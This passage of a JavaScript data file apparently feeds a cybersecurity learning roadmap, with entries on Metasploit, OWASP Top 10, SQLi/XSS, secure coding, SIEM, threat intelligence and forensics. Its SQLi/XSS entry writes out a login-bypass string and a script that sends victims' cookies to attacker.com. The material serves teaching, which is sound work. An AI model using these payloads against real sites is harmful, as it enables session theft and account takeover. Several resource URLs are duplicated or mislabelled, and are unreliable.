    whereIsItUsed: "Metasploit Framework, Exploit-DB, SearchSploit, reverse shells.",
    whatComesNext: "OWASP Top 10",
    learningOutcomes: [
      "Understand the difference between an exploit (the delivery mechanism) and a payload (what executes).",
      "Navigate and use the Metasploit Framework console (msfconsole).",
      "Generate malicious payloads using msfvenom.",
      "Understand the difference between a bind shell and a reverse shell.",
      "Find public exploits on Exploit-DB and adapt them for a specific target."
    ],
    commonMistakes: [
      "Using a bind shell when the target is behind a NAT/Firewall (a reverse shell is needed).",
      "Blindly running exploits from the internet without reviewing the code—some 'exploits' are actually malware targeting the attacker.",
      "Failing to clean up uploaded payloads or modified configurations after a penetration test."
    ],
    realWorldApplications: [
      "Using Metasploit to exploit the EternalBlue (MS17-010) vulnerability and gain SYSTEM access to an unpatched Windows machine.",
      "Generating a Python reverse shell payload, uploading it via a web vulnerability, and catching the connection with Netcat.",
      "Pivoting through a compromised machine to attack internal databases not accessible from the internet."
    ],
    resources: [
      { type: "official", title: "Metasploit Unleashed (OffSec)", url: "https://www.offsec.com/metasploit-unleashed/" },
      { type: "video_en", title: "Metasploit Tutorial (TCM Security)", url: "https://www.youtube.com/watch?v=qlK174d_uu8" },
      { type: "video_hi", title: "Metasploit in Hindi (CodeWithHarry)", url: "https://www.youtube.com/watch?v=qlK174d_uu8" },
      { type: "article", title: "Reverse Shells vs Bind Shells", url: "https://www.netsparker.com/blog/web-security/understanding-reverse-shells/" },
      { type: "github", title: "Exploit Database", url: "https://github.com/offensive-security/exploitdb" },
      { type: "cheat_sheet", title: "Reverse Shell Cheat Sheet", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md" },
      { type: "deep_dive", title: "Metasploit Framework Architecture", url: "https://docs.metasploit.com/" }
    ]
  },
  "n_appsec_1": {
    whyLearnThis: "The OWASP Top 10 is the globally recognized standard for the most critical web application security risks. Every developer and security professional must know these to prevent data breaches and build secure software.",
    whenIsItUsed: "Designing application architecture, conducting code reviews, dynamic application security testing (DAST), and bug bounty hunting.",
    whereIsItUsed: "Web application development, API design, DevSecOps pipelines.",
    whatComesNext: "SQL Injection & XSS",
    learningOutcomes: [
      "Identify all current OWASP Top 10 vulnerabilities (e.g., Broken Access Control, Cryptographic Failures, Injection).",
      "Understand the root causes behind these vulnerabilities.",
      "Know how to test for basic instances of these flaws using tools like Burp Suite or ZAP.",
      "Explain the concept of Insecure Design and why threat modeling is necessary.",
      "Familiarize with the OWASP Application Security Verification Standard (ASVS)."
    ],
    commonMistakes: [
      "Assuming the OWASP Top 10 covers all vulnerabilities—it only covers the most common ones.",
      "Relying solely on automated DAST tools to find logical flaws like Broken Access Control (they require manual testing).",
      "Treating security as a final testing step rather than integrating it into the design phase."
    ],
    realWorldApplications: [
      "Using OWASP guidelines to design a secure authentication and session management system.",
      "Conducting a threat modeling exercise (STRIDE) during the design phase to identify 'Insecure Design' risks.",
      "Using Burp Suite to manually test an API for Insecure Direct Object Reference (IDOR / Broken Access Control)."
    ],
    resources: [
      { type: "official", title: "OWASP Top 10", url: "https://owasp.org/www-project-top-ten/" },
      { type: "video_en", title: "OWASP Top 10 Explained (Simply Cyber)", url: "https://www.youtube.com/watch?v=Vq78bUe0J1I" },
      { type: "video_hi", title: "OWASP Top 10 Hindi (Tech Tutorials)", url: "https://www.youtube.com/watch?v=3Kq1MIfTWCE" },
      { type: "article", title: "Understanding Broken Access Control", url: "https://portswigger.net/web-security/access-control" },
      { type: "github", title: "OWASP NodeGoat (Vulnerable App for Practice)", url: "https://github.com/OWASP/NodeGoat" },
      { type: "cheat_sheet", title: "OWASP ASVS (Standard)", url: "https://owasp.org/www-project-application-security-verification-standard/" },
      { type: "deep_dive", title: "Web Application Hacker's Handbook", url: "https://portswigger.net/web-security" }
    ]
  },
  "n_appsec_2": {
    whyLearnThis: "SQL Injection (SQLi) and Cross-Site Scripting (XSS) are two of the oldest, most common, and most devastating vulnerabilities. SQLi leads to database compromise, while XSS leads to account takeover and client-side attacks.",
    whenIsItUsed: "Developing backend database queries, building frontend UI components, and performing web application penetration testing.",
    whereIsItUsed: "Databases (SQLi), Web Browsers (XSS), ORMs, and template engines.",
    whatComesNext: "Secure Coding Practices",
    learningOutcomes: [
      "Explain how SQL Injection alters database queries to bypass authentication or extract data.",
      "Implement Parameterized Queries (Prepared Statements) to prevent SQLi.",
      "Differentiate between Reflected, Stored, and DOM-based XSS.",
      "Implement context-aware output encoding to prevent XSS.",
      "Understand how Content Security Policy (CSP) acts as defense-in-depth against XSS."
    ],
    commonMistakes: [
      "Using input sanitization (regex filtering) instead of parameterized queries to prevent SQLi.",
      "Assuming ORMs completely prevent SQLi—they don't if you use raw queries or string concatenation in order/group clauses.",
      "Using React's dangerouslySetInnerHTML without sanitizing the input with a library like DOMPurify."
    ],
    realWorldApplications: [
      "Exploiting a login form with `' OR '1'='1` to bypass authentication.",
      "Stealing a user's session cookie by injecting `<script>fetch('http://attacker.com/?cookie='+document.cookie)</script>` into a comment section.",
      "Configuring a strong Content Security Policy header that prevents inline scripts from executing."
    ],
    resources: [
      { type: "official", title: "OWASP: SQL Injection Prevention", url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" },
      { type: "video_en", title: "SQL Injection & XSS Explained (Computerphile)", url: "https://www.youtube.com/watch?v=_jKylhJtPmI" },
      { type: "video_hi", title: "SQLi & XSS Hindi (CodeWithHarry)", url: "https://www.youtube.com/watch?v=hS5xSAyPzHs" },
      { type: "article", title: "PortSwigger: Cross-Site Scripting (XSS)", url: "https://portswigger.net/web-security/cross-site-scripting" },
      { type: "github", title: "SQLmap: Automatic SQLi tool", url: "https://github.com/sqlmapproject/sqlmap" },
      { type: "cheat_sheet", title: "XSS Filter Evasion Cheat Sheet", url: "https://owasp.org/www-community/xss-filter-evasion-cheatsheet" },
      { type: "deep_dive", title: "Content Security Policy (CSP) Reference", url: "https://content-security-policy.com/" }
    ]
  },
  "n_appsec_3": {
    whyLearnThis: "Security cannot be bolted on at the end of development. Secure coding practices ensure that applications are built defensively from day one, minimizing vulnerabilities and passing security audits smoothly.",
    whenIsItUsed: "Writing software, setting up CI/CD pipelines, managing dependencies, and conducting code reviews.",
    whereIsItUsed: "DevSecOps, SAST/DAST tooling, Dependency Management (npm, pip).",
    whatComesNext: "SIEM Solutions (Splunk/ELK)",
    learningOutcomes: [
      "Apply the Principle of Least Privilege in application architecture.",
      "Implement secure error handling and logging (without logging sensitive PII/credentials).",
      "Use Static Application Security Testing (SAST) tools (like SonarQube or Semgrep) in CI/CD.",
      "Manage vulnerable dependencies using Software Composition Analysis (SCA) like Dependabot.",
      "Secure API endpoints with rate limiting, proper authentication (JWT/OAuth), and input validation."
    ],
    commonMistakes: [
      "Hardcoding API keys, passwords, or secrets in source code instead of using environment variables/secrets managers.",
      "Returning detailed stack traces to the end-user, exposing internal architecture details.",
      "Trusting client-side validation—always re-validate input on the server."
    ],
    realWorldApplications: [
      "Running Semgrep in a GitHub Action to block PRs that contain insecure cryptographic functions.",
      "Using AWS Secrets Manager to inject database credentials into a Node.js app at runtime.",
      "Implementing express-rate-limit in a Node.js API to prevent brute-force attacks on the login endpoint."
    ],
    resources: [
      { type: "official", title: "OWASP Secure Coding Practices Quick Reference", url: "https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/" },
      { type: "video_en", title: "DevSecOps and Secure Coding (TechWorld with Nana)", url: "https://www.youtube.com/watch?v=yhbPkxK8QZQ" },
      { type: "video_hi", title: "Secure Coding Concepts Hindi", url: "https://www.youtube.com/watch?v=nzZkKoREEGo" },
      { type: "article", title: "Semgrep: Modern Static Analysis", url: "https://semgrep.dev/docs/" },
      { type: "github", title: "OWASP Cheat Sheet Series", url: "https://github.com/OWASP/CheatSheetSeries" },
      { type: "cheat_sheet", title: "API Security Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html" },
      { type: "deep_dive", title: "Google: Secure Code Guidelines", url: "https://google.github.io/eng-practices/" }
    ]
  },
  "n_soc_1": {
    whyLearnThis: "Security Information and Event Management (SIEM) systems are the brain of the Security Operations Center (SOC). They aggregate logs from firewalls, endpoints, and servers, using correlation rules to detect complex attacks that a single device would miss.",
    whenIsItUsed: "Monitoring network security, investigating incidents, threat hunting, and meeting compliance logging requirements.",
    whereIsItUsed: "Splunk, Elastic Security (ELK), Microsoft Sentinel, IBM QRadar.",
    whatComesNext: "Threat Intelligence",
    learningOutcomes: [
      "Explain the purpose of log aggregation, normalization, and correlation.",
      "Write basic search queries in Splunk (SPL) or Elastic (KQL) to find specific events.",
      "Understand how to create alerts based on threshold events (e.g., 5 failed logins in 1 minute).",
      "Identify the necessary log sources for a SOC (Windows Event Logs, Firewall logs, DNS logs).",
      "Familiarize with the MITRE ATT&CK framework for mapping SIEM alerts to attacker tactics."
    ],
    commonMistakes: [
      "Logging everything without a strategy, leading to massive storage costs and slow search times.",
      "Creating alerts without tuning them, resulting in alert fatigue where analysts ignore real threats.",
      "Failing to parse and normalize logs, making cross-device correlation impossible."
    ],
    realWorldApplications: [
      "Writing a Splunk correlation rule to alert when a user fails login from 5 different countries within an hour (impossible travel).",
      "Using ELK stack to visualize firewall traffic and identify abnormal spikes in outbound data (exfiltration).",
      "Mapping a detected PowerShell execution alert in Microsoft Sentinel to MITRE ATT&CK Technique T1059.001."
    ],
    resources: [
      { type: "official", title: "Splunk Free Training", url: "https://www.splunk.com/en_us/training/free-courses.html" },
      { type: "video_en", title: "What is a SIEM? (IBM Technology)", url: "https://www.youtube.com/watch?v=1id6ERvfozo" },
      { type: "video_hi", title: "SIEM & SOC Explained Hindi", url: "https://www.youtube.com/watch?v=uqCXQgFMHMk" },
      { type: "article", title: "Elastic Security Introduction", url: "https://www.elastic.co/security" },
      { type: "github", title: "Sigma Rules: Generic Signature Format for SIEM", url: "https://github.com/SigmaHQ/sigma" },
      { type: "cheat_sheet", title: "Splunk SPL Quick Reference", url: "https://www.splunk.com/pdfs/solution-guides/splunk-quick-reference-guide.pdf" },
      { type: "deep_dive", title: "MITRE ATT&CK Framework", url: "https://attack.mitre.org/" }
    ]
  },
  "n_soc_2": {
    whyLearnThis: "Threat Intelligence shifts security from reactive to proactive. By understanding attacker motivations, tactics, and Indicators of Compromise (IoCs), organizations can configure defenses to block attacks before they occur.",
    whenIsItUsed: "Updating firewall blocklists, creating new SIEM detection rules, threat hunting, and understanding adversary profiles.",
    whereIsItUsed: "MISP, ThreatConnect, VirusTotal, AlienVault OTX.",
    whatComesNext: "Digital Forensics",
    learningOutcomes: [
      "Define Indicators of Compromise (IoCs): IP addresses, domains, file hashes.",
      "Understand the Pyramid of Pain and why behavioral IoCs (TTPs) are more valuable than hashes.",
      "Familiarize with Threat Intelligence Platforms (TIPs) like MISP.",
      "Consume and analyze threat reports from vendors (CrowdStrike, Mandiant).",
      "Explain the Cyber Kill Chain model."
    ],
    commonMistakes: [
      "Focusing only on blocking IP addresses and hashes (bottom of the Pyramid of Pain), which attackers change trivially.",
      "Submitting sensitive internal documents to public tools like VirusTotal, inadvertently leaking data.",
      "Failing to contextualize threat intel—an APT targeting governments might not be relevant to a small retail business."
    ],
    realWorldApplications: [
      "Integrating AlienVault OTX feeds into a SIEM to automatically alert on connections to known malicious domains.",
      "Using YARA rules to scan enterprise endpoints for files matching the signature of a newly discovered ransomware family.",
      "Reading a Mandiant report on APT29 and creating detection rules for their specific lateral movement techniques."
    ],
    resources: [
      { type: "official", title: "AlienVault Open Threat Exchange (OTX)", url: "https://otx.alienvault.com/" },
      { type: "video_en", title: "Threat Intelligence Explained (Simply Cyber)", url: "https://www.youtube.com/watch?v=U1w4T03B30I" },
      { type: "video_hi", title: "Cyber Threat Intelligence Hindi", url: "https://www.youtube.com/watch?v=dlO-pGLCJPk" },
      { type: "article", title: "The Pyramid of Pain", url: "https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html" },
      { type: "github", title: "MISP: Malware Information Sharing Platform", url: "https://github.com/MISP/MISP" },
      { type: "cheat_sheet", title: "YARA Rule Writing Cheat Sheet", url: "https://yara.readthedocs.io/en/stable/writingrules.html" },
      { type: "deep_dive", title: "Lockheed Martin Cyber Kill Chain", url: "https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html" }
    ]
  },
  "n_soc_3": {
    whyLearnThis: "Digital Forensics and Incident Response (DFIR) is the art of figuring out exactly what happened after a breach. Without proper forensics, you cannot determine what data was stolen, how the attacker got in, or ensure they are fully evicted.",
    whenIsItUsed: "After a security breach, analyzing malware, investigating insider threats, and legal/criminal investigations.",
    whereIsItUsed: "Autopsy, Volatility (memory analysis), Wireshark, KAPE.",
    whatComesNext: "Cyber Security Complete",
    learningOutcomes: [
      "Understand the Incident Response lifecycle: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned.",
      "Explain the concept of 'Order of Volatility' when collecting evidence.",
      "Understand how to create a forensic image (bit-by-bit copy) using tools like dd or FTK Imager.",
      "Familiarize with memory forensics and what artifacts reside in RAM (using Volatility).",
      "Analyze the Windows Registry and Prefetch files for execution evidence."
    ],
    commonMistakes: [
      "Rebooting a compromised machine immediately, which destroys volatile evidence (RAM) and may trigger malware persistence mechanisms.",
      "Working directly on the original evidence drive instead of a forensic copy, rendering the evidence legally inadmissible.",
      "Failing to maintain a strict Chain of Custody for evidence."
    ],
    realWorldApplications: [
      "Using Volatility to analyze a memory dump and extract the decryption keys for a ransomware infection.",
      "Running Autopsy on a forensic image to recover deleted files and analyze browser history.",
      "Using KAPE to quickly collect critical Windows artifacts (Event Logs, Registry) for rapid triage during an active breach."
    ],
    resources: [
      { type: "official", title: "NIST: Computer Security Incident Handling Guide", url: "https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final" },
      { type: "video_en", title: "Digital Forensics Tutorial (13Cubed)", url: "https://www.youtube.com/watch?v=U1w4T03B30I" },
      { type: "video_hi", title: "Digital Forensics & Incident Response Hindi", url: "https://www.youtube.com/watch?v=x0E-2F_4_p8" },
      { type: "article", title: "SANS: The 6 Steps of Incident Response", url: "https://owasp.org/www-community/attacks/" },
      { type: "github", title: "Volatility Foundation: Memory Forensics", url: "https://github.com/volatilityfoundation/volatility3" },
      { type: "cheat_sheet", title: "DFIR Windows Artifacts Poster (SANS)", url: "https://www.sans.org/posters/windows-forensic-analysis/" },
      { type: "deep_dive", title: "Autopsy Digital Forensics Training", url: "https://www.autopsy.com/support/training/" }
    ]
  }
};
